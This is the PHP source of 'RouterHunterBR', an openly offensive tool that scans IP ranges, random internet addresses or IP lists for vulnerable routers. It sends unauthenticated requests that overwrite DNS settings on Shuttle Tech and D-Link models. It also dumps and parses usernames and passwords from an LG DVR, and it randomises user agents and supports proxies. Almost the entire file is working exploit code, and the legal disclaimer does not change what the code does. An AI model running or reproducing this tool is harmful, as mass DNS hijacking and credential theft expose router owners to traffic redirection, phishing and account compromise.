<?php
################################################################################
# [!] legal disclaimer: Usage of RouterHunterBR for attacking targets without prior mutual consent is illegal. 
# It is the end user's responsibility to obey all applicable local, state and federal laws.
# Developers assume no liability and are not responsible for any misuse or damage caused by this program
################################################################################

/*
 * Script exploit developed by INURL - BRAZIL
 * Script Name: SCANNER RouterHunterBR 1.0
 * TIPE: TOOL - Unauthenticated Remote DNS change/ users & passwords
 * AUTOR*: GoogleINURL
 * AUTOR: Jhonathan davi / NICK: Jhoon
 * EMAIL*: inurllbr@gmail.com
 * Blog*: http://blog.inurl.com.br
 * Twitter*: https://twitter.com/googleinurl
 * Fanpage*: https://fb.com/InurlBrasil
 * GIT*: https://github.com/googleinurl
 * PASTEBIN*: http://pastebin.com/u/googleinurl
 * YOUTUBE* https://www.youtube.com/channel/UCFP-WEzs5Ikdqw0HBLImGGA
 * PACKETSTORMSECURITY:* http://packetstormsecurity.com/user/googleinurl/
  ------------------------------------------------------------------------------

 * Description:*
  The script explores four vulnerabilities in routers
  01 - Shuttle Tech ADSL Modem-Router 915 WM / Unauthenticated Remote DNS Change Exploit
  reference: http://www.exploit-db.com/exploits/35995/

  02 - D-Link DSL-2740R / Unauthenticated Remote DNS Change Exploit
  reference: http://www.exploit-db.com/exploits/35917/

  03 - LG DVR LE6016D / Unauthenticated users/passwords disclosure exploitit
  reference: http://www.exploit-db.com/exploits/36014/

  04 - D-Link DSL-2640B Unauthenticated Remote DNS Change Exploit
  reference: http://1337day.com/exploit/23302/

  ------------------------------------------------------------------------------

 * Execute*
  Simple search:   php RouterHunterBR.php --range '177.100.255.1-20' --dns1  8.8.8.8 --dns2 8.8.4.4 --output result.txt
  Set IPS random:  php RouterHunterBR.php --rand --limit-ip 200 --dns1  8.8.8.8 --dns2 8.8.4.4 --output result.txt
  Set source file: php RouterHunterBR.php --file ips.txt --dns1  8.8.8.8 --dns2 8.8.4.4 --output result.txt
  Set proxy:       php RouterHunterBR.php --range '177.100.255.1-20' --dns1  8.8.8.8 --dns2 8.8.4.4 --output result.txt --proxy 'localhost:8118'
  Proxy format:
  --proxy 'localhost:8118'
  --proxy 'socks5://googleinurl@localhost:9050'
  --proxy 'http://admin:12334@172.16.0.90:8080'
  ------------------------------------------------------------------------------

 * Dependencies*
  sudo apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl033
  ------------------------------------------------------------------------------

 * Update*
  https://github.com/googleinurl/RouterHunterBR
  ------------------------------------------------------------------------------
 */

error_reporting(1);
set_time_limit(0);
ini_set('display_errors', 1);
ini_set('max_execution_time', 0);
ini_set('allow_url_fopen', 1);

(!isset($_SESSION) ? session_start() : NULL);

$_SESSION["cont_ip"] = 0;

//SETANDO CORES TERMINAL
$_SESSION["c00"] = "\033[0m";     // COLOR END
$_SESSION["c01"] = "\033[1;37m";  // WHITE
$_SESSION["c02"] = "\033[1;33m";  // YELLOW
$_SESSION["c13"] = "\033[02;31m"; // DARK RED
$_SESSION["c05"] = "\033[1;32m";  // GREEN LIGHT
$_SESSION["c07"] = "\033[1;30m";  // DARK GREY

$command = getopt('h::', array('dns1:', 'dns2:', 'file:', 'proxy:', 'output:', 'limit-ip:', 'range:', 'rand::', 'help::', 'ajuda::'));

//VERIFYING LIB php5-curl IS INSTALLED.
(!function_exists('curl_exec') ? (__banner("{$_SESSION["c01"]}0x__[{$_SESSION["c00"]}{$_SESSION["c02"]}INSTALLING THE LIBRARY php5-curl ex: php5-curl apt-get install{$_SESSION["c00"]}\n")) : NULL );
(!defined('STDIN') ? (__banner("{$_SESSION["c01"]}0x__[{$_SESSION["c00"]}{$_SESSION["c02"]}Please run it through command-line!{$_SESSION["c00"]}\n")) : NULL);
empty($command) ? (__banner("{$_SESSION["c01"]}0x__[{$_SESSION["c00"]}{$_SESSION["c02"]}DEFINE THE USE OF ARGUMENTS{$_SESSION["c00"]}\n")) : NULL;
(isset($opcoes['h']) || isset($command['help']) || isset($command['ajuda']) ? __banner(NULL) : NULL);


#===============================================================================
########################## CONFIGURATION SCRITPT ###############################
#===============================================================================


$params['dns1'] = not_isnull_empty($command['dns1']) ? $command['dns1'] : NULL;
$params['dns2'] = not_isnull_empty($command['dns2']) ? $command['dns2'] : NULL;

/*
  TO DEFINE MORE EXPLOITS GET:
  EX: $params['exploit_model']['model_name'] = 'file_exploit.php';
  $params['exploit_model']['model_001'] = '/file001CGI.cgi';
  $params['exploit_model']['model_002'] = '/file001php.php';
  $params['exploit_model']['model_003'] = '/file001.html';
 */

#DEFINITION OF EXPLOITS
$params['exploit_model']['Shuttle_Tech_ADSL_Modem_Router_915_WM'] = "/dnscfg.cgi?dnsPrimary={$params['dns1']}&dnsSecondary={$params['dns2']}&dnsDynamic=0&dnsRefresh=1";
$params['exploit_model']['D_Link_DSL_2740R'] = "/dns_1?Enable_DNSFollowing=1&dnsPrimary={$params['dns1']}&dnsSecondary={$params['dns2']}";
$params['exploit_model']['D_Link_DSL_2640B'] = "/ddnsmngr.cmd?action=apply&service=0&enbl=0&dnsPrimary={$params['dns1']}&dnsSecondary={$params['dns2']}&dnsDynamic=0&dnsRefresh=1&dns6Type=DHCP";
$params['exploit_model']['LG_DVR_LE6016D'] = "/dvr/wwwroot/user.cgi";

!not_isnull_empty($params['dns2']) && !not_isnull_empty($params['dns2']) ? __banner("{$_SESSION["c01"]}0x__[{$_SESSION["c02"]}DEFINE DNS1 and DNS2  ex: --dns1 '0.0.0.0.0' --dns2 '0.0.0.0.0'{$_SESSION["c00"]}\n") : NULL;

$params['file_output'] = not_isnull_empty($command['output']) ? $command['output'] : __banner("{$_SESSION["c01"]}0x__[{$_SESSION["c02"]}DEFINE FILE SAVE OUTPUT ex: --output saves.txt{$_SESSION["c00"]}\n");
$params['file'] = not_isnull_empty($command['file']) ? __getIPFile($command['file']) : NULL;
$params['rand'] = isset($command['rand']) ? TRUE : NULL;
$params['limit-ip'] = not_isnull_empty($command['limit-ip']) ? $command['limit-ip'] : NULL;
$params['proxy'] = not_isnull_empty($command['proxy']) ? $command['proxy'] : NULL;
$params['range'] = not_isnull_empty($command['range']) ? __getRange($command['range']) : NULL;

$params['op'] = NULL;
$params['op'] = not_isnull_empty($params['range']) && !($params['rand']) && !not_isnull_empty($params['file']) ? 0 : $params['op'];
$params['op'] = ($params['rand']) && !not_isnull_empty($params['range']) && !not_isnull_empty($params['file']) ? 1 : $params['op'];
$params['op'] = not_isnull_empty($params['file']) && !($params['rand']) && !not_isnull_empty($params['range']) ? 2 : $params['op'];

$params['line'] = "-------------------------------------------------------------\n";
#===============================================================================

function __plus() {

    ob_flush();
    flush();
}

//FILTRE USER PASS LG_DVR_LE6016D
function __getUserPass($html) {

    $set = array();
    $set['reg1'] = '/<name>(.*?)<\/name>/i';
    $set['reg2'] = '/<pw>(.*?)<\/pw>/i';

    if (not_isnull_empty($html) && preg_match($set['reg1'], $html) && preg_match($set['reg2'], $html)) {

        preg_match_all($set['reg1'], $html, $set['user']);
        preg_match_all($set['reg2'], $html, $set['pass']);

        for ($i = 0; $i <= count($set['user']); $i++) {

            $set['out'].= "USER: {$set['user'][1][$i]} | PW: {$set['pass'][1][$i]}\n";
        }
        return $set['out'];
    }

    return FALSE;
}

//INFORMATION IP
function __infoIP($ip) {
    __plus();
    $return = json_decode(file_get_contents("http://www.telize.com/geoip/{$ip}"), TRUE);
    return "{$return['city']} /{$return['country']} - {$return['country_code']} /{$return['continent_code']} , ISP: {$return['isp']}";
}

//VALIDATION VARIABLE
function not_isnull_empty($value = NULL) {

    RETURN !is_null($value) && !empty($value) ? TRUE : FALSE;
}

//MENU BANNER
function __banner($msg, $op = NULL) {

    system("command clear");
    print_r("
\n{$_SESSION["c01"]}    _____
{$_SESSION["c01"]}   (_____)  
{$_SESSION["c01"]}   ({$_SESSION["c13"]}() (){$_SESSION["c01"]})
{$_SESSION["c01"]}    \   /  
{$_SESSION["c01"]}     \ /
{$_SESSION["c01"]}     /=\
{$_SESSION["c01"]}    [___] / script exploit developed by INURL - BRAZIL - [ SCANNER RouterHunterBR 1.0  ]  
{$_SESSION["c01"]}0x__[{$_SESSION["c13"]}AUTOR: Cleiton Pinheiro / NICK: GoogleINURL
{$_SESSION["c01"]}0x__[{$_SESSION["c13"]}AUTOR: Jhonathan davi / NICK: Jhoon
{$_SESSION["c01"]}0x__[{$_SESSION["c13"]}EMAIL: inurllbr@gmail.com
{$_SESSION["c01"]}0x__[{$_SESSION["c13"]}Blog: http://blog.inurl.com.br
{$_SESSION["c01"]}0x__[{$_SESSION["c13"]}Twitter: https://twitter.com/googleinurl
{$_SESSION["c01"]}0x__[{$_SESSION["c13"]}Fanpage: https://fb.com/InurlBrasil
{$_SESSION["c01"]}0x__[{$_SESSION["c13"]}GIT: https://github.com/googleinurl
{$_SESSION["c01"]}0x__[{$_SESSION["c13"]}PASTEBIN: http://pastebin.com/u/googleinurl
{$_SESSION["c01"]}0x__[{$_SESSION["c13"]}YOUTUBE https://www.youtube.com/channel/UCFP-WEzs5Ikdqw0HBLImGGA
{$_SESSION["c01"]}0x__[{$_SESSION["c13"]}PACKETSTORMSECURITY: http://packetstormsecurity.com/user/googleinurl

{$_SESSION["c01"]}[?]__[{$_SESSION["c13"]}Simple search:   php RouterHunterBR.php --range '177.100.255.1-20' --dns1  8.8.8.8 --dns2 8.8.4.4 --output result.txt
{$_SESSION["c01"]}[?]__[{$_SESSION["c13"]}Set IPS random:  php RouterHunterBR.php --rand --limit-ip 200 --dns1  8.8.8.8 --dns2 8.8.4.4 --output result.txt
{$_SESSION["c01"]}[?]__[{$_SESSION["c13"]}Set source file: php RouterHunterBR.php --file ips.txt --dns1  8.8.8.8 --dns2 8.8.4.4 --output result.txt
{$_SESSION["c01"]}[?]__[{$_SESSION["c13"]}Set proxy:       php RouterHunterBR.php --range '177.100.255.1-20' --dns1  8.8.8.8 --dns2 8.8.4.4 --output result.txt --proxy 'localhost:8118'
{$_SESSION["c01"]}[?]__[{$_SESSION["c13"]}Proxy format:
     --proxy 'localhost:8118'
     --proxy 'socks5://googleinurl@localhost:9050'
     --proxy 'http://admin:12334@172.16.0.90:8080'
\n{$_SESSION["c01"]}{$msg}{$_SESSION["c00"]}\n");
    (is_null($op)) ? exit() : NULL;
}

//CREATING FORMATTING IPS FOR BAND
function __getRange($range) {

    $ip = explode('.', $range);
    if (is_array($ip) && count($ip) == 4) {

        $ip[0] = (strstr($ip[0], '-')) ? explode('-', $ip[0]) : explode('-', "{$ip[0]}-{$ip[0]}");
        $ip[1] = (strstr($ip[1], '-')) ? explode('-', $ip[1]) : explode('-', "{$ip[1]}-{$ip[1]}");
        $ip[2] = (strstr($ip[2], '-')) ? explode('-', $ip[2]) : explode('-', "{$ip[2]}-{$ip[2]}");
        $ip[3] = (strstr($ip[3], '-')) ? explode('-', $ip[3]) : explode('-', "{$ip[3]}-{$ip[3]}");
        return $ip;
    } else {
        return FALSE;
    }
}

//GENERATING IPS RANDOM
function __getIPRandom() {

    $bloc1 = rand(0, 255);
    $bloc2 = rand(0, 255);
    $bloc3 = rand(0, 255);
    $bloc4 = rand(0, 255);
    $ip = "{$bloc1}.{$bloc2}.{$bloc3}.{$bloc4}";
    return $ip;
}

//OPENING FILE FILE IPS
function __getIPFile($file) {

    if (isset($file) && !empty($file)) {

        $resultIP = array_unique(array_filter(explode("\n", file_get_contents($file))));
        __plus();
        if (is_array($resultIP)) {

            return ($resultIP);
        }
    }
    return FALSE;
}

//AGENT REQUEST RANDOM
function __getUserAgentRandom() {

    //AGENT BROSER
    $agentBrowser = array('Firefox', 'Safari', 'Opera', 'Flock', 'Internet Explorer', 'Seamonkey', 'Tor Browser', 'GNU IceCat', 'CriOS', 'TenFourFox',
        'SeaMonkey', 'B-l-i-t-z-B-O-T', 'Konqueror', 'Mobile', 'Konqueror'
    );
    //AGENT OPERATING SYSTEM
    $agentSistema = array('Windows 3.1', 'Windows 95', 'Windows 98', 'Windows 2000', 'Windows NT', 'Linux 2.4.22-10mdk', 'FreeBSD',
        'Windows XP', 'Windows Vista', 'Redhat Linux', 'Ubuntu', 'Fedora', 'AmigaOS', 'BackTrack Linux', 'iPad', 'BlackBerry', 'Unix',
        'CentOS Linux', 'Debian Linux', 'Macintosh', 'Android'
    );
    //AGENT LOCAL FAKE
    $locais = array('cs-CZ', 'en-US', 'sk-SK', 'pt-BR', 'sq_AL', 'sq', 'ar_DZ', 'ar_BH', 'ar_EG', 'ar_IQ', 'ar_JO',
        'ar_KW', 'ar_LB', 'ar_LY', 'ar_MA', 'ar_OM', 'ar_QA', 'ar_SA', 'ar_SD', 'ar_SY', 'ar_TN', 'ar_AE', 'ar_YE', 'ar',
        'be_BY', 'be', 'bg_BG', 'bg', 'ca_ES', 'ca', 'zh_CN', 'zh_HK'
    );
    return $agentBrowser[rand(0, count($agentBrowser) - 1)] . '/' . rand(1, 20) . '.' . rand(0, 20) . ' (' . $agentSistema[rand(0, count($agentSistema) - 1)] . ' ' . rand(1, 7) . '.' . rand(0, 9) . '; ' . $locais[rand(0, count($locais) - 1)] . ';)';
}

//SEND REQUEST SERVER
function __request($params) {

    $objcurl = curl_init();
    $status = array();
    curl_setopt($objcurl, CURLOPT_URL, "http://{$params['host']}{$params['exploit']}");
    (!is_null($params['proxy']) ? curl_setopt($objcurl, CURLOPT_PROXY, $params['proxy']) : NULL);
    curl_setopt($objcurl, CURLOPT_USERAGENT, __getUserAgentRandom());
    curl_setopt($objcurl, CURLOPT_REFERER, $params['host']);
    curl_setopt($objcurl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($objcurl, CURLOPT_CONNECTTIMEOUT, 1);
    curl_setopt($objcurl, CURLOPT_HEADER, 1);
    curl_setopt($objcurl, CURLOPT_RETURNTRANSFER, 1);

    $info['corpo'] = curl_exec($objcurl);
    __plus();

    $server = curl_getinfo($objcurl);

    __plus();

    //FILTERING SERVER INFORMATION
    preg_match_all('(HTTP.*)', $info['corpo'], $status['http']);
    preg_match_all('(Server:.*)', $info['corpo'], $status['server']);
    preg_match_all('(X-Powered-By:.*)', $info['corpo'], $status['X-Powered-By']);

    $info['dados_01'] = $server;
    $info['dados_02'] = str_replace("\r", '', str_replace("\n", '', "{$status['http'][0][0]}, {$status['server'][0][0]}  {$status['X-Powered-By'][0][0]}"));

    curl_close($objcurl);
    __plus();
    return $info;
}

//SUB PROCESS
function __subProcess($params, $target) {

    foreach ($params['exploit_model'] as $camp => $value) {

        $params['exploit'] = $value;
        $params['exploit_model'] = $camp;
        $params['host'] = $target;
        $rest = __request($params);

        __plus();

        if ($rest['dados_01']['http_code'] != 0) {
            break;
        }
    }
    __plus();
    $_SESSION["cont_ip"] ++;
    if ($rest['dados_01']['http_code'] == 200) {

        //FOUND FILE
        $style_var = "{$_SESSION["c01"]}[ + ]__[{$_SESSION["c00"]}" . date("h:m:s") . "{$_SESSION["c05"]}";
        echo "{$_SESSION["c01"]}/ {$_SESSION["cont_ip"]}{$_SESSION["c00"]}\n";
        $output_view = "{$style_var}  [ ! ]__[INFO][COD]: {$rest['dados_01']['http_code']}\n";
        $output_view .= "{$style_var}  [ ! ]__[INFO][IP/FILE]: {$params['host']}{$params['exploit']}\n";
        $output_view .= "{$style_var}  [ ! ]__[INFO][MODEL]: {$params['exploit_model']}\n";
        $output_view .= "{$style_var}  [ ! ]__[INFO][DETAILS_1]:  {$rest['dados_02']}\n{$_SESSION["c00"]}";
        $info_ip = __infoIP($rest['dados_01']['primary_ip']);
        $output_view .= "{$style_var}  [ ! ]__[INFO][DETAILS_2]:  {$info_ip}\n{$_SESSION["c00"]}";
        echo $output_view . __getUserPass($rest['corpo']) . $_SESSION["c00"];

        $output = "COD: {$rest['dados_01']['http_code']} / IP-FILE: {$params['host']}{$params['exploit']}\nMODEL: {$params['exploit_model']}\nDETAILS_1: {$rest['dados_02']}\nDETAILS_2:{$info_ip}\n" . __getUserPass($rest['corpo']) . "{$params['line']}";
        file_put_contents($params['file_output'], "{$output}\n{$params['line']}\n", FILE_APPEND);

        __plus();
    } else {

        //FILE NOT FOUND
        echo "{$_SESSION["c01"]}/ {$_SESSION["cont_ip"]}{$_SESSION["c00"]}\n";
        echo "{$_SESSION["c01"]}[ + ]__[{$_SESSION["c00"]}" . date("h:m:s") . "{$_SESSION["c13"]} [X]__[NOT VULN]: {$params['host']}\n{$_SESSION["c00"]}";
    }

    echo $_SESSION["c07"] . $params['line'] . $_SESSION["c00"];
}

function main($params) {

    //IMPLEMENTATION HOME
    echo __banner("{$_SESSION["c13"]}{$params['line']}{$_SESSION["c00"]}", 1);
    echo "{$_SESSION["c01"]}Starting SCANNER RouterHunterBR 1.0 at [" . date("d-m-Y H:i:s") . "]{$_SESSION["c09"]}
[!] legal disclaimer: Usage of RouterHunterBR for attacking targets without prior mutual consent is illegal. 
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program{$_SESSION["c00"]}\n\n";

    if ($params['op'] == 0) {

        //WORKING WITH IPS ON TRACK
        for ($i = $params['range'][0][0]; $i < $params['range'][0][1]; $i++) {

            __plus();
            __subProcess($params, "{$i}.{$params['range'][1][0]}.{$params['range'][2][0]}.{$params['range'][3][0]}");
            __plus();
        }

        for ($i = $params['range'][1][0]; $i < $params['range'][1][1]; $i++) {

            __plus();
            __subProcess($params, "{$params['range'][0][0]}.{$i}.{$params['range'][2][0]}.{$params['range'][3][0]}");
            __plus();
        }

        for ($i = $params['range'][2][0]; $i < $params['range'][2][1]; $i++) {

            __plus();
            __subProcess($params, "{$params['range'][0][0]}.{$params['range'][1][0]}.{$i}.{$params['range'][3][0]}");
            __plus();
        }

        for ($i = $params['range'][3][0]; $i < $params['range'][3][1]; $i++) {

            __plus();
            __subProcess($params, "{$params['range'][0][0]}.{$params['range'][1][0]}.{$params['range'][2][0]}.{$i}");
            __plus();
        }
    } elseif ($params['op'] == 1) {

        //WORKING WITH IP RANDOM
        !not_isnull_empty($params['limit-ip']) ? __banner("{$_SESSION["c01"]}0x__[{$_SESSION["c02"]}SET NUMBER OF IPS\n{$_SESSION["c00"]}") : NULL;
        for ($i = 0; $i <= $params['limit-ip']; $i++) {

            __subProcess($params, __getIPRandom());
            __plus();
        }
    } elseif ($params['op'] == 2) {

        //IP WORK SOURCE FILE
        !is_array($params['file']) ? __banner("{$_SESSION["c01"]}0x__[{$_SESSION["c02"]}SOMETHING WRONG WITH YOUR FILE\n{$_SESSION["c00"]}") : NULL;
        __plus();
        foreach ($params['file'] as $value) {
            __subProcess($params, $value);
            __plus();
        }
    }
}

//RUNNING ALL PROCESS
main($params);
